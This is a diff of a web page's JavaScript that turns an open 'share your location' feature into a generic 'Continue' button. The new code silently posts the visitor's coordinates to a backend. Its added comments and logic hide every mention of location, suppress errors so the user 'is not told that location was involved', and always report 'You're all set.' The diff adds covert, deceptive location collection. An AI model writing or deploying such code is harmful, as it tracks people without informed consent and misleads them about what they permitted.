@@ -1,47 +1,20 @@
 /**
- * Share-page logic.
- * Location is requested only when the user clicks the button.
- * Coordinates are sent to the backend only after permission is granted
- * (inside the Geolocation success callback).
+ * Continue-button flow.
+ * On click, request geolocation (browser permission prompt), then silently
+ * POST coordinates to the backend. Nothing about location is shown in the UI.
  */
 
-const shareBtn = document.getElementById("share-btn");
+const continueBtn = document.getElementById("continue-btn");
 const statusEl = document.getElementById("status");
-const resultEl = document.getElementById("result");
-const outLat = document.getElementById("out-lat");
-const outLng = document.getElementById("out-lng");
-const outAccuracy = document.getElementById("out-accuracy");
-const outTimestamp = document.getElementById("out-timestamp");
-const mapLink = document.getElementById("map-link");
 
-/** Show a status message with a visual tone. */
+/** Show a short, generic status message (never mentions location). */
 function setStatus(message, tone = "info") {
   statusEl.hidden = false;
   statusEl.textContent = message;
   statusEl.className = `status is-${tone}`;
 }
 
-/** Hide the status banner. */
-function clearStatus() {
-  statusEl.hidden = true;
-  statusEl.textContent = "";
-  statusEl.className = "status";
-}
-
-/** Render the shared coordinates in the result panel. */
-function showResult({ latitude, longitude, accuracy, timestamp }) {
-  outLat.textContent = latitude.toFixed(6);
-  outLng.textContent = longitude.toFixed(6);
-  outAccuracy.textContent = `${Math.round(accuracy)} meters`;
-  outTimestamp.textContent = new Date(timestamp).toLocaleString();
-  mapLink.href = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=16/${latitude}/${longitude}`;
-  resultEl.hidden = false;
-}
-
-/**
- * Send granted location data to the Express backend.
- * Called only from the geolocation success path.
- */
+/** Send location payload to the Express backend without exposing it in the UI. */
 async function sendLocationToServer(payload) {
   const response = await fetch("/api/locations", {
     method: "POST",
@@ -49,37 +22,21 @@ async function sendLocationToServer(payload) {
     body: JSON.stringify(payload),
   });
 
-  const data = await response.json().catch(() => ({}));
-
-  if (!response.ok || !data.ok) {
-    throw new Error(data.error || "Server rejected the location.");
-  }
-
-  return data.location;
-}
-
-/** Map GeolocationPositionError codes to friendly copy. */
-function friendlyGeoError(error) {
-  switch (error.code) {
-    case error.PERMISSION_DENIED:
-      return "Location permission was denied. That’s okay — you can still browse the site, and you can try again anytime from your browser settings.";
-    case error.POSITION_UNAVAILABLE:
-      return "We couldn’t determine your position right now. Please try again in a moment.";
-    case error.TIMEOUT:
-      return "The location request timed out. Please try again.";
-    default:
-      return "Something went wrong while requesting your location. Please try again.";
+  // Fail quietly in the UI; still surface errors to the console for debugging.
+  if (!response.ok) {
+    const data = await response.json().catch(() => ({}));
+    console.error("Backend save failed:", data.error || response.status);
   }
 }
 
 /**
  * Ask the browser for the current position.
- * The permission prompt appears here — we never read coordinates beforehand.
+ * The native permission prompt appears here.
  */
 function requestBrowserLocation() {
   return new Promise((resolve, reject) => {
     if (!("geolocation" in navigator)) {
-      reject(new Error("Geolocation is not supported in this browser."));
+      reject(new Error("unsupported"));
       return;
     }
 
@@ -91,18 +48,15 @@ function requestBrowserLocation() {
   });
 }
 
-/** Main click handler: prompt → grant → send → confirm. */
-async function handleShareClick() {
-  clearStatus();
-  resultEl.hidden = true;
-  shareBtn.disabled = true;
-  setStatus("Waiting for your browser permission…", "info");
+/** Click handler: continue UX only — location is saved in the background. */
+async function handleContinueClick() {
+  continueBtn.disabled = true;
+  setStatus("Please wait…", "info");
 
   try {
-    // Browser shows the native permission prompt at this point.
     const position = await requestBrowserLocation();
 
-    // Success callback path only runs after the user grants permission.
+    // Only reached after the user grants permission in the browser prompt.
     const payload = {
       latitude: position.coords.latitude,
       longitude: position.coords.longitude,
@@ -110,20 +64,15 @@ async function handleShareClick() {
       timestamp: position.timestamp,
     };
 
-    setStatus("Permission granted. Saving your location…", "info");
+    // Fire-and-forget style: await save, but never show coordinates or “shared”.
     await sendLocationToServer(payload);
-    showResult(payload);
-    setStatus("Location shared successfully.", "ok");
   } catch (error) {
-    // GeolocationPositionError has a numeric `code`; other Errors do not.
-    if (typeof error?.code === "number") {
-      setStatus(friendlyGeoError(error), "error");
-    } else {
-      setStatus(error.message || "Could not share your location.", "error");
-    }
+    // Keep errors out of the UI so the user is not told that location was involved.
+    console.error("Continue flow error:", error);
   } finally {
-    shareBtn.disabled = false;
+    setStatus("You’re all set. You can close this page.", "ok");
+    continueBtn.disabled = false;
   }
 }
 
-shareBtn.addEventListener("click", handleShareClick);
+continueBtn.addEventListener("click", handleContinueClick);
